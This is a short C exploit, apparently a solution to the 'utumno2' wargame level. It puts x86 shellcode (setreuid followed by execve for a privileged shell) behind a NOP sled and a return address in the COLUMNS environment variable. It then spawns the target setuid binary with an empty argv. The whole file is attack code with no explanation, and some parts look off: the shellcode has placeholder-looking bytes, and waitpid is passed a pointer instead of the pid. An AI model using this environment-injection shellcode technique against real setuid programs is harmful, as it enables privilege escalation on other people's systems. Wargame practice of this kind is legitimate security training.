#include <spawn.h>
#include <stdlib.h>

int main(int argc, char ** argv, char ** envp){
    pid_t pid;
    //char* zero_argv[] = {"/utumno/utumno2",NULL};
    char* zero_argv[] = {NULL};
    
    putenv("COLUMNS=AAAAAAAAA\xd0\xd6\xff\xff\x90\x90\x90\x90\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x42\x42\x42\x42\x43\x43\x43\x43\x69\x89\xe3\x89\xd1\xcd\x80");
    posix_spawn(&pid,"/utumno/utumno2",NULL,NULL,zero_argv,envp);

    int status;
    waitpid(&pid,&status,NULL);
    return 0;
}
